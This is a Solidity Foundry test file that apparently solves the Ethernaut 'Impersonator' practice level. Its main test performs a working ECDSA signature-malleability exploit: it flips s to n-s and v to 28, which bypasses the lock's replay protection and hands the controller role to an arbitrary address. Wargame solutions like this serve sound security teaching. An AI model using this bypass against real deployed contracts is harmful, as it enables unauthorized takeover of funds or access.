// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";
import {EthernautImpersonator, ECLocker} from "../../src/ethernaut2025/Impersonator.sol";

// Factory-provided signature (r, s, v) that recovers to the initial
// controller. In the real level the factory deploys the lock with it.
uint256 constant R = 11397568185806560130291530949248708355673262872727946990834312389557386886033;
uint256 constant S = 54405834204020870944342294544757609285398723182661749830189277079337680158706;
uint8 constant V = 27;

contract ImpersonatorTest is Test {
    EthernautImpersonator impersonator;
    ECLocker locker;

    function setUp() public {
        impersonator = new EthernautImpersonator(1336);
        bytes memory signature = abi.encode([uint256(R), uint256(S), uint256(V)]);
        impersonator.deployNewLock(signature);
        locker = impersonator.lockers(0);
    }

    function testImpersonatorExploit() public {
        // Signature malleability: (r, n-s, 28) recovers the same signer as
        // (r, s, 27) but produces a different keccak256([r,s,v]) key, so the
        // constructor's replay protection (keyed on the original bytes) is
        // bypassed and we can change the controller to anything.
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - S);
        locker.changeController(28, bytes32(R), s2, address(0));
        assertEq(address(locker.controller()), address(0));
    }
}

contract ImpersonatorControlTest is Test {
    function testLockerStartsWithController() public {
        EthernautImpersonator impersonator = new EthernautImpersonator(1336);
        bytes memory signature = abi.encode([uint256(R), uint256(S), uint256(V)]);
        impersonator.deployNewLock(signature);
        // The lock initializes with the recovered controller, not zero.
        assertTrue(address(impersonator.lockers(0).controller()) != address(0));
    }
}

// end

